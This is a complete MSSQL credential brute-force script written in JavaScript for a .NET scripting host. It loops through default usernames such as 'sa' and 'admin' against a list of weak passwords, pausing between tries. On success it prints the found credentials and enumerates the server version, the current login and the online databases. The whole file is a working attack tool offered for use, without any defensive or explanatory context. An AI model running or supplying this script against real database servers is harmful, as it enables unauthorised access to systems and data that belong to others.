(function() {
    var host = "127.0.0.1";
    var port = 1433;
    var timeout = 3; 
    var delayMs = 1000;

    var usernames = ["sa", "admin", "root", "user", "test", "guest"];
    var passwords = [
        "",
        "sa",
        "password",
        "123456",
        "admin",
        "mssql",
        "sql",
        "root",
        "123456789",
        "letmein"
    ];

    var SqlConnection = System.Data.SqlClient.SqlConnection;
    var SqlCommand = System.Data.SqlClient.SqlCommand;
    var Thread = System.Threading.Thread;

    var total = 0;
    var maxAttempts = usernames.length * passwords.length;
    var result = "[+] Starting MSSQL brute-force on " + host + ":" + port + "\n";
    result += "[+] Timeout: " + timeout + "s | Delay: " + (delayMs / 1000) + "s\n";
    result += "[+] Users: " + usernames.length + " | Passwords: " + passwords.length + "\n\n";

    for (var i = 0; i < usernames.length; i++) {
        for (var j = 0; j < passwords.length; j++) {
            total++;
            var user = usernames[i];
            var pass = passwords[j];
            result += "[" + total + "/" + maxAttempts + "] Trying: " + user + " / " + (pass === "" ? "(empty)" : pass) + " ... ";

            var connString = "Server=" + host + "," + port + ";Database=master;User Id=" + user + ";Password=" + pass + ";Connection Timeout=" + timeout + ";";

            var conn = null;
            var success = false;
            var errorMsg = "";

            try {
                conn = new SqlConnection(connString);
                conn.Open();
                success = true;
            } catch (e) {
                errorMsg = e.Message;

                if (total === 1 && (errorMsg.indexOf("network-related") >= 0 || errorMsg.indexOf("timeout") >= 0 || errorMsg.indexOf("impossible d'établir") >= 0)) {
                    return "ERROR: Cannot connect to MSSQL (" + host + ":" + port + ") - service down, filtered, or unreachable";
                }
            }

            if (success) {
                result += "SUCCESS!\n\n";
                result += "[+] CREDENTIALS FOUND:\n";
                result += "    Host: " + host + ":" + port + "\n";
                result += "    User: " + user + "\n";
                result += "    Pass: " + (pass === "" ? "(empty)" : pass) + "\n\n";

                try {
                    var cmdVersion = new SqlCommand("SELECT @@VERSION", conn);
                    var version = cmdVersion.ExecuteScalar().ToString();

                    var cmdUser = new SqlCommand("SELECT SYSTEM_USER", conn);
                    var currentUser = cmdUser.ExecuteScalar().ToString();

                    var cmdDbs = new SqlCommand("SELECT name FROM sys.databases WHERE state = 0", conn);
                    var reader = cmdDbs.ExecuteReader();
                    var dbs = [];
                    while (reader.Read()) {
                        dbs.push(reader.GetString(0));
                    }
                    reader.Close();

                    result += "[+] MSSQL Version: " + version.substring(0, 80) + "\n";
                    result += "[+] Connected as: " + currentUser + "\n";
                    result += "[+] Online Databases (" + dbs.length + "):\n";
                    for (var k = 0; k < Math.min(dbs.length, 10); k++) {
                        result += "    - " + dbs[k] + "\n";
                    }
                    if (dbs.length > 10) {
                        result += "    ... (+ " + (dbs.length - 10) + " more)\n";
                    }
                } catch (e) {
                    result += "[!] Info gathering failed: " + e.Message + "\n";
                }

                conn.Close();
                return result;
            } else {
                result += "FAILED\n";
            }

            if (conn != null && conn.State == 1) {
                conn.Close();
            }

            if (total < maxAttempts) {
                Thread.Sleep(delayMs);
            }
        }
    }

    result += "\n[!] No valid credentials found.\n";
    return result;
})()
